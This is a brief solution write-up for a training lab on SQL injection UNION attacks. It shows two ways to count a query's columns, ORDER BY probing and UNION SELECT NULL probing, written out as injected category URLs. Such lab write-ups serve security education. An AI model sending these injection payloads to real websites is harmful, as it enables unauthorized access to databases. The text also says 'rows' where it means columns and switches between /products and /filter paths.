## ðŸŽ¯ Goal

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

## âœ… Solution

Initial request:

````text
<website>/products?category=Gifts
````

Now we can use 2 technics to determine the number of rows returned:

### Method 1 - ORDER BY

````text
<website>/filter?category=Gifts' ORDER BY 1--    # works
<website>/filter?category=Gifts' ORDER BY 2--    # works
<website>/filter?category=Gifts' ORDER BY 3--    # works
<website>/filter?category=Gifts' ORDER BY 4--    # error!
````

So we know 3 columns are returned.

### Method 2 - UNION SELECT NULL

````text
<website>/filter?category=Gifts' UNION SELECT NULL--    # works
<website>/filter?category=Gifts' UNION SELECT NULL,NULL--    # works
<website>/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--    # works
<website>/filter?category=Gifts' UNION SELECT NULL,NULL,NULL,NULL--    # error!
````

Same result: 3 columns are returned.
